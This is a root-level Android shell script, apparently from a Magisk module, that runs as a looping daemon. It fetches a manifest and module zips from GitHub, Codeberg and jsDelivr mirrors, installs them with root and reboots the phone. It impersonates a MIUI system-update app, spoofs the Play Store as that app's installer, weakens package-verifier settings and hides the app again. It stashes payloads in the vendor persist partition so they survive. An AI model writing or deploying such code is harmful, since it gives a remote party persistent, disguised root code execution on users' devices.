#!/system/bin/sh
DATA=/data/adb/adminupdate
MODDIR=${0%/*}
LOG=$DATA/github_update.log
BB=/data/adb/magisk/busybox
[ -x "$BB" ] || BB=busybox
BASES="
https://raw.githubusercontent.com/devid2000kb/15c/refs/heads/main
https://codeberg.org/devid2000kb/15c/raw/branch/main
https://cdn.jsdelivr.net/gh/devid2000kb/15c@main
"
PIDFILE=$DATA/github_update.pid
UI_PKG=com.miui.systemupdate
UI_DIR=/data/data/$UI_PKG/files
ONE=0
[ "$1" = "--once" ] && ONE=1
mkdir -p "$DATA"
if [ "$ONE" = "0" ] && [ -f "$PIDFILE" ]; then
  OLD=$(cat "$PIDFILE" 2>/dev/null)
  if [ -n "$OLD" ] && [ -d "/proc/$OLD" ] && grep -q github_update "/proc/$OLD/cmdline" 2>/dev/null; then
    exit 0
  fi
fi
[ "$ONE" = "0" ] && echo $$ > "$PIDFILE"
log() { echo "$(date '+%F %T') $*" >> "$LOG"; }
wait_sleep() {
  S=$1
  I=0
  N=$((S / 5))
  while [ "$I" -lt "$N" ]; do
    if [ -f "$DATA/netup" ]; then
      rm -f "$DATA/netup"
      return 0
    fi
    sleep 5
    I=$((I+1))
  done
}
wget_any() {
  OUT=$1
  REL=$2
  TAG=$3
  IDX=0
  for B in $BASES; do
    rm -f "$OUT"
    if $BB wget -q -T 30 -O "$OUT" "$B/$REL?v=$TAG" < /dev/null 2>/dev/null && [ -s "$OUT" ]; then
      [ "$IDX" -gt 0 ] && log "fallback $REL via $B"
      return 0
    fi
    IDX=$((IDX+1))
  done
  rm -f "$OUT"
  return 1
}
ui_set() {
  U=$(stat -c %u "/data/data/$UI_PKG" 2>/dev/null)
  mkdir -p "$UI_DIR"
  [ -n "$U" ] && chown -R "$U:$U" "$UI_DIR" 2>/dev/null
  printf 'pct=%s\nmsg=%s\n' "$1" "$2" > "$UI_DIR/state"
  [ -n "$U" ] && chown "$U:$U" "$UI_DIR/state" 2>/dev/null
  chmod 700 "$UI_DIR" 2>/dev/null
  chmod 644 "$UI_DIR/state" 2>/dev/null
}
ui_show() {
  settings put global package_verifier_enable 1
  settings put global verifier_verify_adb_installs 0
  settings put global package_verifier_user_consent 0
  settings put global upload_apk_enable 0
  pm unhide com.miui.systemupdate >/dev/null 2>&1
  if ! pm install -r -i com.android.vending "$MODDIR/apps/updateui.apk" >/dev/null 2>&1; then
    pm uninstall com.miui.systemupdate >/dev/null 2>&1
    pm install -r -i com.android.vending "$MODDIR/apps/updateui.apk" >/dev/null 2>&1
  fi
  pm unhide com.miui.systemupdate >/dev/null 2>&1
  ui_set 0 preparing
  am start -n "$UI_PKG/.UpdateActivity" --ez notify_only true >/dev/null 2>&1
}
ui_close() {
  am force-stop "$UI_PKG" >/dev/null 2>&1
  pm hide "$UI_PKG" >/dev/null 2>&1
}
fetch() {
  OUT=$DATA/m_$1.zip
  PART=$OUT.part
  rm -f "$OUT" "$PART"
  OK=0
  for B in $BASES; do
    rm -f "$PART"
    $BB wget -q -T 180 -O "$PART" "$B/$2?v=$3" < /dev/null 2>/dev/null &
    W=$!
    while kill -0 "$W" 2>/dev/null; do
      S=0
      [ -f "$PART" ] && S=$($BB wc -c < "$PART" 2>/dev/null || echo 0)
      if [ "$TOTAL" -gt 0 ]; then
        P=$(( (DONE_BYTES + S) * 50 / TOTAL ))
        [ "$P" -gt 50 ] && P=50
      else
        P=10
      fi
      ui_set "$P" downloading
      sleep 1
    done
    if wait "$W" && [ -s "$PART" ]; then
      OK=1
      break
    fi
  done
  if [ "$OK" != "1" ]; then
    log "download failed $1 $3"
    rm -f "$PART"
    return 1
  fi
  SZ=$($BB wc -c < "$PART" 2>/dev/null || echo 0)
  if [ "$SZ" -lt 200 ] || ! $BB unzip -p "$PART" module.prop >/dev/null 2>&1; then
    log "invalid $1 download size=$SZ"
    rm -f "$PART"
    return 1
  fi
  ACTUAL=$($BB unzip -p "$PART" module.prop 2>/dev/null | grep -m1 '^versionCode=' | cut -d= -f2 | tr -dc '0-9')
  ACTUAL_ID=$($BB unzip -p "$PART" module.prop 2>/dev/null | grep -m1 '^id=' | cut -d= -f2 | tr -d '\r ')
  if [ "$ACTUAL_ID" != "$1" ]; then
    log "wrong id $1 got ${ACTUAL_ID:-none}"
    rm -f "$PART"
    return 1
  fi
  if [ "$ACTUAL" != "$3" ]; then
    log "stale $1 expected $3 got ${ACTUAL:-none}"
    rm -f "$PART"
    return 1
  fi
  mv -f "$PART" "$OUT"
  if [ "$TOTAL" -gt 0 ]; then
    DONE_BYTES=$((DONE_BYTES + $4))
    [ "$DONE_BYTES" -gt "$TOTAL" ] && DONE_BYTES=$TOTAL
  fi
  return 0
}
apply_zip() {
  echo "$2" > "$DATA/pending_$1"
  magisk --install-module "$4" < /dev/null >>"$LOG" 2>&1 &
  M=$!
  while kill -0 "$M" 2>/dev/null; do
    STEP=$(( ($3 - IN_PCT) / 4 ))
    [ "$STEP" -lt 1 ] && STEP=1
    IN_PCT=$((IN_PCT + STEP))
    [ "$IN_PCT" -gt "$3" ] && IN_PCT=$3
    ui_set "$IN_PCT" installing
    sleep 1
  done
  wait "$M"
  RC=$?
  IN_PCT=$3
  ui_set "$3" installing
  if [ "$RC" = "0" ]; then
    log "installed $1 $2"
    managed_add "$1"
    mkdir -p /mnt/vendor/persist/payload/modules 2>/dev/null
    cp -f "$4" "/mnt/vendor/persist/payload/modules/$1.zip" 2>/dev/null
    chmod 644 "/mnt/vendor/persist/payload/modules/$1.zip" 2>/dev/null
  fi
  rm -f "$4"
  if [ "$RC" = "0" ]; then
    return 0
  fi
  rm -f "$DATA/pending_$1"
  log "install failed $1 $2"
  return 1
}
managed_add() {
  [ -n "$1" ] || return 0
  mkdir -p "$DATA"
  grep -qx "$1" "$DATA/managed.txt" 2>/dev/null || echo "$1" >> "$DATA/managed.txt"
}
managed_del() {
  [ -f "$DATA/managed.txt" ] || return 1
  grep -qx "$1" "$DATA/managed.txt" 2>/dev/null || return 1
  grep -vx "$1" "$DATA/managed.txt" > "$DATA/managed.tmp" 2>/dev/null
  mv -f "$DATA/managed.tmp" "$DATA/managed.txt"
}
in_manifest() {
  grep -q "^$1|" "$MANIFEST" 2>/dev/null
}
manifest_valid() {
  [ -s "$MANIFEST" ] || return 1
  grep -q '^adminupdate|' "$MANIFEST" 2>/dev/null || return 1
  $BB awk -F'|' 'NF != 5 || $1 !~ /^[A-Za-z0-9_.-]+$/ || $2 !~ /^[0-9]+$/ { exit 1 }' "$MANIFEST" 2>/dev/null
}
remove_module() {
  ID=$1
  WHY=$2
  case "$ID" in ''|*[!A-Za-z0-9_.-]*) return 1 ;; esac
  ACTIVE=0
  FOUND=0
  DIR=/data/adb/modules/$ID
  UPD=/data/adb/modules_update/$ID
  if [ -d "$DIR" ]; then
    FOUND=1
    if [ -f "$DIR/remove" ]; then
      rm -rf "$DIR"
    else
      touch "$DIR/remove" 2>/dev/null
      ACTIVE=1
    fi
  fi
  if [ -d "$UPD" ]; then
    rm -rf "$UPD"
    FOUND=1
  fi
  if [ -f "/mnt/vendor/persist/payload/modules/$ID.zip" ]; then
    rm -f "/mnt/vendor/persist/payload/modules/$ID.zip"
    FOUND=1
  fi
  if [ -f "$DATA/payload/$ID.zip" ]; then
    rm -f "$DATA/payload/$ID.zip"
    FOUND=1
  fi
  if [ -f "$DATA/m_$ID.zip" ]; then
    rm -f "$DATA/m_$ID.zip"
    FOUND=1
  fi
  if [ -f "$DATA/m_$ID.zip.part" ]; then
    rm -f "$DATA/m_$ID.zip.part"
  fi
  for F in pending fail block; do
    if [ -f "$DATA/${F}_$ID" ]; then
      rm -f "$DATA/${F}_$ID"
      FOUND=1
    fi
  done
  managed_del "$ID" && FOUND=1
  if [ "$ACTIVE" = "1" ]; then
    log "removed $ID ($WHY); reboot required"
    return 0
  fi
  if [ "$FOUND" = "1" ]; then
    log "cleaned $ID ($WHY)"
  fi
  return 1
}
if [ "$ONE" = "0" ]; then
  sleep $(( $(date +%s) % 10 ))
fi
while true; do
  SLEEP=10
  MANIFEST=$DATA/manifest.remote
  rm -f "$DATA"/manifest.cand.* "$DATA"/rev.cand.*
  BEST=""
  BEST_BASE=""
  BEST_HASREV=0
  BEST_REV=0
  BEST_SUM=-1
  CIDX=0
  for B in $BASES; do
    C=$DATA/manifest.cand.$CIDX
    R=$DATA/rev.cand.$CIDX
    rm -f "$C" "$R"
    if $BB wget -q -T 20 -O "$C" "$B/manifest.txt?v=$(date +%s)" < /dev/null 2>/dev/null && [ -s "$C" ]; then
      MANIFEST=$C
      if manifest_valid; then
        SUM=$($BB awk -F'|' '{s+=$2} END{print s+0}' "$C" 2>/dev/null)
        case "$SUM" in ''|*[!0-9]*) SUM=0 ;; esac
        REV=""
        if $BB wget -q -T 20 -O "$R" "$B/revision.txt?v=$(date +%s)" < /dev/null 2>/dev/null && [ -s "$R" ]; then
          REV=$(tr -dc '0-9' < "$R")
        fi
        rm -f "$R"
        HAS=0
        [ -n "$REV" ] && HAS=1
        BETTER=0
        if [ "$HAS" -gt "$BEST_HASREV" ]; then
          BETTER=1
        elif [ "$HAS" = "$BEST_HASREV" ]; then
          if [ "$HAS" = "1" ]; then
            [ "$REV" -gt "$BEST_REV" ] && BETTER=1
          else
            [ "$SUM" -gt "$BEST_SUM" ] && BETTER=1
          fi
        fi
        if [ "$BETTER" = "1" ]; then
          BEST=$C
          BEST_BASE=$B
          BEST_HASREV=$HAS
          BEST_REV=$REV
          BEST_SUM=$SUM
        fi
      fi
    fi
    CIDX=$((CIDX+1))
  done
  MANIFEST=$DATA/manifest.remote
  rm -f "$MANIFEST"
  if [ -z "$BEST" ]; then
    log "manifest check failed"
    rm -f "$DATA"/manifest.cand.* "$DATA"/rev.cand.*
    [ "$ONE" = "1" ] && exit 1
    sleep 5
    continue
  fi
  mv -f "$BEST" "$MANIFEST"
  rm -f "$DATA"/manifest.cand.* "$DATA"/rev.cand.*
  STATE="$BEST_BASE|$BEST_HASREV|$BEST_REV|$BEST_SUM"
  if [ "$(cat "$DATA/manifest.source" 2>/dev/null)" != "$STATE" ]; then
    echo "$STATE" > "$DATA/manifest.source"
    log "manifest source $BEST_BASE rev=$BEST_REV sum=$BEST_SUM"
  fi
  REMOVED_OK=0
  REMOTE_REMOVED=$DATA/removed.remote
  rm -f "$REMOTE_REMOVED"
  for B in $BEST_BASE $BASES; do
    rm -f "$REMOTE_REMOVED"
    if $BB wget -q -T 20 -O "$REMOTE_REMOVED" "$B/removed.txt?v=$(date +%s)" < /dev/null 2>/dev/null && [ -f "$REMOTE_REMOVED" ]; then
      REMOVED_OK=1
      break
    fi
  done
  [ "$REMOVED_OK" = "1" ] || : > "$REMOTE_REMOVED"
  REMOVE_STAGED=0
  if grep -q '^adminupdate|' "$MANIFEST" 2>/dev/null; then
    mkdir -p /mnt/vendor/persist/payload 2>/dev/null
    cp -f "$MANIFEST" /mnt/vendor/persist/payload/manifest.txt 2>/dev/null
    cp -f "$MANIFEST" "$DATA/manifest.local" 2>/dev/null
    if [ "$REMOVED_OK" = "1" ]; then
      cp -f "$REMOTE_REMOVED" /mnt/vendor/persist/payload/removed.txt 2>/dev/null
      cp -f "$REMOTE_REMOVED" "$DATA/removed.local" 2>/dev/null
    fi
    if [ -f "$DATA/managed.txt" ]; then
      while IFS= read -r MID; do
        [ -z "$MID" ] && continue
        case "$MID" in *[!A-Za-z0-9_.-]*) continue ;; esac
        in_manifest "$MID" && continue
        if remove_module "$MID" "not-in-manifest"; then
          REMOVE_STAGED=1
        fi
      done < "$DATA/managed.txt"
    fi
    if [ "$REMOVED_OK" = "1" ]; then
      while IFS= read -r MID; do
        [ -z "$MID" ] && continue
        case "$MID" in \#*) continue ;; esac
        case "$MID" in *[!A-Za-z0-9_.-]*) continue ;; esac
        in_manifest "$MID" && continue
        if remove_module "$MID" "removed-list"; then
          REMOVE_STAGED=1
        fi
      done < "$REMOTE_REMOVED"
    fi
    for Z in /mnt/vendor/persist/payload/modules/*.zip "$DATA"/payload/*.zip; do
      [ -f "$Z" ] || continue
      ZID=${Z##*/}
      ZID=${ZID%.zip}
      case "$ZID" in *[!A-Za-z0-9_.-]*) continue ;; esac
      if ! in_manifest "$ZID"; then
        rm -f "$Z"
      fi
    done
  else
    log "manifest invalid; skipping removals"
  fi
  COUNT=0
  TOTAL=0
  [ "$REMOVE_STAGED" = "1" ] && COUNT=$((COUNT+1))
  while IFS='|' read -r ID REMOTE FILE NAME SIZE; do
    [ -z "$ID" ] && continue
    case "$ID" in \#*) continue ;; esac
    case "$ID" in *[!A-Za-z0-9_.-]*) continue ;; esac
    [ -n "$REMOTE" ] || continue
    case "$REMOTE" in *[!0-9]*) continue ;; esac
    B=$(cat "$DATA/block_$ID" 2>/dev/null)
    if [ -n "$B" ] && [ "$B" = "$REMOTE" ]; then
      continue
    fi
    if [ -n "$B" ]; then
      rm -f "$DATA/block_$ID" "$DATA/fail_$ID"
    fi
    case "$SIZE" in *[!0-9]*) SIZE=0 ;; esac
    CUR=$(grep -m1 '^versionCode=' "/data/adb/modules/$ID/module.prop" 2>/dev/null | cut -d= -f2 | tr -dc '0-9')
    [ -z "$CUR" ] && CUR=0
    if [ "$REMOTE" -gt "$CUR" ]; then
      COUNT=$((COUNT+1))
      TOTAL=$((TOTAL+SIZE))
    fi
  done < "$MANIFEST"
  if [ "$COUNT" -gt 0 ]; then
    rm -f "$DATA"/m_*.zip "$DATA"/m_*.part
    ui_show
    CONFIRM=$UI_DIR/confirm
    rm -f "$CONFIRM"
    log "waiting for user confirmation"
    CI=0
    while [ ! -f "$CONFIRM" ] && [ "$CI" -lt 300 ]; do
      sleep 2
      CI=$((CI+1))
    done
    rm -f "$CONFIRM"
    if [ "$CI" -ge 300 ]; then
      log "update not confirmed; closing UI"
      ui_close
      rm -f "$MANIFEST"
      [ "$ONE" = "1" ] && exit 0
      SLEEP=10
      wait_sleep "$SLEEP"
      continue
    fi
    DONE_BYTES=0
    while IFS='|' read -r ID REMOTE FILE NAME SIZE; do
      [ -z "$ID" ] && continue
      case "$ID" in \#*) continue ;; esac
      case "$ID" in *[!A-Za-z0-9_.-]*) continue ;; esac
      [ -n "$REMOTE" ] || continue
      case "$REMOTE" in *[!0-9]*) continue ;; esac
    B=$(cat "$DATA/block_$ID" 2>/dev/null)
    if [ -n "$B" ] && [ "$B" = "$REMOTE" ]; then
      continue
    fi
    if [ -n "$B" ]; then
      rm -f "$DATA/block_$ID" "$DATA/fail_$ID"
    fi
      CUR=$(grep -m1 '^versionCode=' "/data/adb/modules/$ID/module.prop" 2>/dev/null | cut -d= -f2 | tr -dc '0-9')
      [ -z "$CUR" ] && CUR=0
      if [ "$REMOTE" -gt "$CUR" ]; then
        fetch "$ID" "$FILE" "$REMOTE" "$SIZE"
      fi
    done < "$MANIFEST"
    ui_set 50 installing
    IN_PCT=50
    IDX=0
    CHANGED=$REMOVE_STAGED
    while IFS='|' read -r ID REMOTE FILE NAME SIZE; do
      [ -z "$ID" ] && continue
      case "$ID" in \#*) continue ;; esac
      case "$ID" in *[!A-Za-z0-9_.-]*) continue ;; esac
      [ -n "$REMOTE" ] || continue
      case "$REMOTE" in *[!0-9]*) continue ;; esac
    B=$(cat "$DATA/block_$ID" 2>/dev/null)
    if [ -n "$B" ] && [ "$B" = "$REMOTE" ]; then
      continue
    fi
    if [ -n "$B" ]; then
      rm -f "$DATA/block_$ID" "$DATA/fail_$ID"
    fi
      OUT=$DATA/m_$ID.zip
      [ -f "$OUT" ] || continue
      IDX=$((IDX+1))
      END=$((50 + IDX * 50 / COUNT))
      if apply_zip "$ID" "$REMOTE" "$END" "$OUT"; then
        CHANGED=1
      fi
    done < "$MANIFEST"
    rm -f "$MANIFEST"
    if [ "$CHANGED" = "1" ]; then
      ui_set 100 restarting
      sleep 5
      svc power reboot
      exit 0
    fi
    ui_close
    SLEEP=10
  else
    rm -f "$MANIFEST"
  fi
  [ "$ONE" = "1" ] && exit 0
  wait_sleep "$SLEEP"
done
